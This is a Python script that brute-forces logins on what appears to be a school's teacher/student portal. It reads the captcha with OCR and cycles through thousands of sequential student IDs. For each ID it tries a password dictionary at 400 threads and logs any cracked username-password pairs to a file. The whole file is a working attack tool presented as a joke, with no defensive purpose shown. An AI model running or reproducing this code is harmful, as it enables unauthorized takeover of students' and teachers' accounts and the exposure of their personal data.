"""玩笑，笑过给个赞呗
"""

from PIL import Image
import requests
from io import BytesIO
import pytesseract
from config import *
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor


class Login(object):
    def __init__(self, username):
        self.session = requests.session()
        self.captcha = ''
        self.get_captcha_img()
        self.username = username

    def get_captcha_img(self):
        content = self.session.get(teacher_student_captcha_url)
        img = Image.open(BytesIO(content.content))
        captcha = pytesseract.image_to_string(img)
        # img.show()
        # text = input("识别为： " + captcha + '若出现错误请更改[否则回车跳过]: ')
        # if text:
        #     captcha = text
        self.set_captcha(captcha)
        return captcha

    def set_captcha(self, captcha):
        self.captcha = captcha

    def login_action(self, password):
        print("test {} for {}".format(password, self.username))
        teacher_student_payload['j_username'] = self.username
        teacher_student_payload['j_password'] = password
        teacher_student_payload['validateCode'] = self.captcha
        request = self.session.post(check_student_url1,
                                    headers=teacher_student_header,
                                    data=teacher_student_payload)

        if int(request.headers['Content-Length']) == 22:
            print("catch {}'s password : {} ".format(self.username, password))
            with open('get_password.txt', 'a') as f:
                f.write(self.username + '-' + password + '\n')
                return 1
        if int(request.headers['Content-Length']) == 32:
            print("code error")
            return -1
        return 0


def thread_pool_login(login):
    with open("password.txt", 'r') as f:  # password dict
        with ThreadPoolExecutor(400) as Executor:
            for line in f:
                password = line.strip('\n')
                try:
                    Executor.submit(login.login_action, password)
                except Exception as e:
                    print(e)
    print(login.username + ": 完成！")


def thread_pool_add_user(id):
    print("[*] id: {} start!".format(id))
    login = Login(id)
    while True:
        state = login.login_action(id)  # test if captcha code is valid
        if state == -1:  # if not make new session
            login = Login(id)
        else:
            thread_pool_login(login)
            break


def main():
    for id_low in range(3000, 10000):
        with ProcessPoolExecutor(4) as Executor:
            try:
                r = Executor.submit(thread_pool_add_user, '2015' + str(id_low))
                print(r.result())
            except Exception as e:
                print(e)
    print("All done !")


if __name__ == '__main__':
    main()
